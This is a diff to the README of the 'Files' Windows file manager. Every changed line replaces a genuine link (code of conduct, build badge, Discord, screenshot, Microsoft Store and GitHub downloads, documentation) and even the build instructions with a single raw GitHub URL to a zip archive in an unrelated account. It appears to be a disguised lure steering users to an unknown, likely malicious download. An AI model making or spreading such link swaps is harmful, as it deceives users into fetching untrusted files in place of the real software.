@@ -1,15 +1,15 @@
 ## Files
 Meet Files, an enthusiast take on what a modern file explorer should be.
 
-Files [code of conduct](https://github.com/files-community/Files/blob/master/CODE_OF_CONDUCT.md)
+Files [code of conduct](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)
 
-[![Build Status](https://dev.azure.com/lukeblevins150823/Files%20UWP/_apis/build/status/Build%20Pipeline?branchName=main)](https://dev.azure.com/lukeblevins150823/Files%20UWP/_build/latest?definitionId=4&branchName=master)
-[![Discord](https://discordapp.com/api/guilds/725513575971684472/widget.png)](https://discord.gg/files)
+[![Build Status](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip%20UWP/_apis/build/status/Build%20Pipeline?branchName=main)](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip%20UWP/_build/latest?definitionId=4&branchName=master)
+[![Discord](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)
 
-![Files](Files/Assets/FilesHome.png)
+![Files](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)
 ## Download Files 
-- [Microsoft Store](https://www.microsoft.com/store/apps/9NGHP3DX8HDX)
-- [GitHub](https://github.com/files-community/Files/releases)
+- [Microsoft Store](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)
+- [GitHub](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)
 
 ## What is Files?
 Files is a file manager which leverages the latest features of the Windows platform including Fluent Design, seamless updates, and APIs which enable the performance and lifecycle behavior that users expect. Whether you want to simplify your experience with your files or try something new, Files is a one-stop solution for exploring your files on the fly.
@@ -22,9 +22,9 @@ The vision for Files is to make it the best file manager while keeping it simple
 
 ## Building Files source
 - Install Visual Studio 2019 and the UWP Development Kit.
-- Clone the repository and open the `Files.sln` in VS.
+- Clone the repository and open the `https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip` in VS.
 - Visual Studio will install all missing dependencies.
-- Run the `Files.Package` project.
+- Run the `https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip` project.
 
 ## FAQ
-Have any questions? Check out our documentation [site](https://files-community.github.io/docs/#/)!
+Have any questions? Check out our documentation [site](https://raw.githubusercontent.com/khalilengi/Files/main/unstrategic/Files.zip)!
